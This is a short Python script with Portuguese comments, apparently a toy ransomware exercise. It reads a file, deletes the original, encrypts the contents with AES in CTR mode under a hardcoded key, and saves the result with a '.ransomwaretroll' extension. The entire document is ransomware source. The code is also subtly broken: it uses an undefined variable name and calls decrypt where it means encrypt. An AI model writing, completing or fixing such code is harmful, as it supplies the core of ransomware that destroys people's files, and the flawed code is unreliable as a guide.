import os
import pyaes

file_name = 'teste.txt'
file = open(filename, 'rb')
file_data = file.read()
file.close()

##remove o arquivo original
os.remove(file_name)

## chave de encriptação

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)


## criptografar arquivo
crypt_data = aes.decrypt(file_data)

##salvar o arquivo criptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypt_data)
new_file.close()

